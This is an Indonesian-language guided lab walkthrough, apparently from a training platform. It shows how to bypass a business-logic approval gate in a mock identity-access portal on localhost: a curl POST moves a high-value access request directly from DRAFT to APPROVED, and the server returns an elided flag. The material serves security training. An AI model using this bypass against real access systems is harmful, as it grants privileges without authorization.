# Panduan Praktik Terbimbing: Audit Insecure Design pada AuthShield Identity

Dalam latihan terarah ini, Anda akan mempraktikkan proses pembuktian cacat desain alur logika bisnis pada portal tata kelola identitas **AuthShield Identity (Enterprise SSO & Access Management)** pada `http://127.0.0.1:8016`.

---

### Tahap 1: Pemetaan Alur Status Entitas & Aturan Bisnis
1. Buka peramban web dan akses halaman portal:
   `http://127.0.0.1:8016/`
2. Perhatikan tabel **Pending Resource Entitlements & Access Requests**:
   - Permohonan `#1001`: Developer Cloud Sandbox ($120) berstatus `DRAFT`.
   - Permohonan `#1002`: AI & GPU Cluster Access ($15,000) berstatus `PENDING_APPROVAL`.
   - Permohonan `#9999`: Executive Tier-0 Datacenter Infrastructure Clearance ($50,000) milik `learner` berstatus `DRAFT`.
3. Evaluasi aturan kebijakan bisnis: Permohonan $\ge \$500$ dirancang membutuhkan otorisasi manajer eksekutif.

---

### Tahap 2: Pengujian Endpoint Transisi REST API
1. Amati endpoint API untuk transisi status entitas:
   `POST /api/orders/<id>/transition`
2. Buka terminal Zitera Lab dan periksa daftar permohonan aktif via API:
   ```bash
   curl -s http://127.0.0.1:8016/api/orders
   ```

---

### Tahap 3: Eksploitasi Bypass Gerbang Otorisasi
1. Kirimkan payload yang secara ilegal meminta transisi langsung dari `DRAFT` menjadi `APPROVED` pada permohonan bernilai tinggi `#9999`:
   ```bash
   curl -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"target_state": "APPROVED"}'
   ```
2. **Temuan Kritis:**
   - Server mengembalikan respons `200 OK`:
     ```json
     {
       "message": "Access request 9999 transitioned to APPROVED",
       "flag": "ZITERA{...}"
     }
     ```
   - Alur persetujuan manajer eksekutif berhasil dilompati secara penuh karena ketiadaan invarian mesin status di lapisan backend!
3. Salin bukti flag berformat `ZITERA{...}` dan kirimkan ke Zitera Lab desktop untuk menyelesaikan modul ini.
